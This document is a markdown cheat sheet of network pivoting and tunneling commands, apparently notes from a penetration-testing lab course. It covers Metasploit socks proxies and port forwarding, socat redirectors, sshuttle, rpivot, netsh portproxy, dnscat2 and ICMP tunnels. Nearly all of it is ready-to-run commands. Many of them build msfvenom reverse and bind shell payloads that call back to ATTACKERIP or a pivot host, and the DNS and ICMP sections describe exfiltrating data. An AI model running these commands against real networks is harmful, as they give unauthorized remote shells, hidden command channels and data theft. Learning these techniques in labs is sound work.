# How to use Socks with Metasploit?
```
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```
(This will setup a socks proxy)
```
socks4 	127.0.0.1 9050
```
(Add it to you /etc/proxychain.conf)
```
use post/multi/manage/autoroute
set SESSION ID
set SUBNET SUBNET
run
```
(This will route all the traffic of the Internal subnet via Proxychain)
```
run autoroute -p
```
(this will should you the routes avaiable)
```
proxychains nmap IPSUBNET -p3389 -sT -v -Pn
```
(Test example)


# How to (Local)PortForward via Metasploit
```
portfwd add -l 3300 -p 3389 -r 172.16.5.19
```
(Above command requests the Meterpreter session to start a listener on our attack host's local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session. 
Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.)


# How to (Remote)PortForward via Metasploit
```
portfwd add -R -l 8081 -p 1234 -L ATTACKERIP
```
(This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081)
```
set payload windows/x64/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
set LPORT 8081 
set LHOST 0.0.0.0 
run
```
(This setup a lister on port 8080 on out machine)
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=PIVOTIP -f exe -o backupscript.exe LPORT=1234
```
(This will create a payload that talks from Victim 2 back to Pivot server. Lastly the portfw will reversefw the traffic from pivot back to us.)


# How to (Remote) PortForward via Metasploit+Socat
`socat TCP4-LISTEN:8080,fork TCP4:ATTACKERIP:80` (On pivot)
(Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18).)
```
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=PIVOTIP -f exe -o backupscript.exe LPORT=8080
```
(That will connect back to our re-director, which is running on our Ubuntu server. 
We will also start a listener on our attack host because as soon as socat receives a connection from a target, it will redirect all the traffic to our attack host's listener, where we would be getting a shell.)
Send the payload to the Vitctim2
(Accessible only from Pivot)
```
use /multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 80
run
```
(This setup a listener on our machine listening on 0.0.0.0:80 which is the port that receives traffic from Socat on Pivot)


# How to (Bind) shell via Metasploit+Socat 
(We can create a bind shell payload for Windows and execute it on the Windows host. 
At the same time, we can create a socat redirector on the Ubuntu server, which will listen for incoming connections from a Metasploit bind handler and forward that to a bind shell payload on a Windows target.)
```
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
```
(This will prepare the blind shell)
```
socat TCP4-LISTEN:8080,fork TCP4:VICTIM2IP:8443 (On Pivot)
```
(We can start a socat bind shell listener, which listens on port 8080 and forwards packets to Vitctim2 server 8443)
```
use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOST PIVOTIP
set LPORT 8080
run
```


# Dynamic (Forward) on Windows via Plink.exe
```
plink -D 9050 ubuntu@10.129.15.50
```
(The Windows attack host starts a plink.exe process with the below command-line arguments to start a dynamic port forward over the Ubuntu server. 
This starts an SSH session between the Windows attack host and the Ubuntu server, and then plink starts listening on port 9050.)


# SSH(Dynamic) Tunneling via SSHUTTLE
(Usefull to avoid opening ports in IPtables)
```
sudo sshuttle -r USERNAME@PIVOTIP SUBNET -v 
```
(The Username and IP are of the Pivot machine that have access to the Victim2 subnet. Then we ship which subnet we want to tunnel via the PIVOT)
Ex: `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v` 
(we specify the option -r to connect to the remote machine with a username and password. Then we need to include the network or IP we want to route through the pivot host, in our case, is the network 172.16.5.0/23.)


# WEBServer Pivot with RPivot
```
sudo git clone https://github.com/klsecservices/rpivot.git
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0 (On Attacker)
```
(This setup the listening server on port 9999 on out Attacking machine)
Copy Rpivot **Client.py** to the Victim
```
python2.7 client.py --server-ip ATTACKERIP --server-port 9999 (On Victim)
```
(This connect the victim to Listener Attacker on port 9999)
```
proxychains chromium VICTIMIP:80
```
(This proxychain chromium and allow us to open victim:80 on our machine which otherwise would be closed from outside)


# PortFw in Windows
(Setup port proxy on Windows host between the host and the internal subnet. Which should help to reach the internal from **windows:listenport**)
```
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=LOCALIPPIVOT connectport=3389 connectaddress=VICTIMIP (on Pivot)
```
(This setup a listening server on PIVOT:8080 and redirect all the traffic to a Internal Victim) --> This can also be used as reverse whee the **connectaddress=ATTACKERIP**
```
netsh.exe interface portproxy show v4tov4 (on Pivot)
```
(Check routes)
Example:
```
C:\Windows\system32> netsh.exe interface portproxy show v4tov4
Listen on ipv4:             Connect to ipv4:
Address         Port        Address         Port
--------------- ----------  --------------- ----------
10.129.42.198   8080        172.16.5.25     3389
```
RDP to the Windows:8080 (on Attacker)
(This should point to the Victim:3389 of the Internal LAN) 


# DNS Tunneling on Windows(Secured) aka C2C Shell over DNS
(Send traffic via TXT records, usefull for Domain DNS exfiltering)
```
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler
bundle install
```

```
sudo ruby dnscat2.rb --dns host=LOCALIP,port=53,domain=inlanefreight.local --no-cache (on Attacker)
```
(This setup a DNS tunneling server on our machine. Copy the secret key)
```
git clone https://github.com/lukebaggett/dnscat2-powershell.git (on Victim)
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver ATTACKERIP -Domain inlanefreight.local -PreSharedSecret SECRETKEY -Exec cmd 
```
(This start the commutation on the Client to the listening server on port 53, remember to use the secret key from the Server)
```
window -i ID
```
(on Attacker)
(From the Attacker DNS server to interact with opened sessions. From there you can run any command you want as a shell.) 


# ICMP Tunneling with Socks proxy
(Ex-filtrate data via Ping, useful if outgoing ping is allowed)
```
git clone https://github.com/utoni/ptunnel-ng.git
sudo ./autogen.sh 
```
(This will generate a binary)
Copy the binary to the Pivot machine

```
sudo ./ptunnel-ng -r10.129.202.64 -R22 
```
(On Pivot)
(This starts the tunnel on the Pivot aka Victim. The IP address following -r should be the IP we want ptunnel-ng to accept connections on.
In our case will be the Pivot IP.)
```
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22 
```
(on Attacker)
(Attempt to connect to the ptunnel-ng server (-p `<ipAddressofTarget>`) but ensure this happens through local port 2222 (-l2222). Connecting through local port 2222 allows us to send traffic through the ICMP tunnel.)
```
ssh -p 2222 -l ubuntu 127.0.0.1
```
 (on Attacker)
(This connect to the victim and proxy the traffic via ICMP)
```
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
proxychains nmap -sV -sT 172.16.5.19 -p3389
```
(This will open a Dynamic PortFW to Pivot and then via Proxychain we can connect to the Internal subnet accessible only via Pivot machine.
All the traffic is exfiltrated via ICMP/ping tunneling)


# ICMP Tunneling with Socks proxy
(Exfiltrate data via RDP, usefull if RDP is allowed only.
aka double hopping with 2 Pivot **You -- Pivot1 -- Pivot2 -- Victim**)
https://github.com/nccgroup/SocksOverRDP/releases
(Upload these libraries, used by RDP protocol to send data)
```
regsvr32.exe SocksOverRDP-Plugin.dll (On the Pivot)
```
(Register the DDL via An Admin shell)
```
./SocksOverRDP-Server.exe
```
 (On the Pivot2)
This will run the RDP socks proxy server on the Pivot2 that have access to the Victim as Internal SUBNET
Run proxyfier pe and add a socks5 127.0.0.1:1080 (on Pivot 1)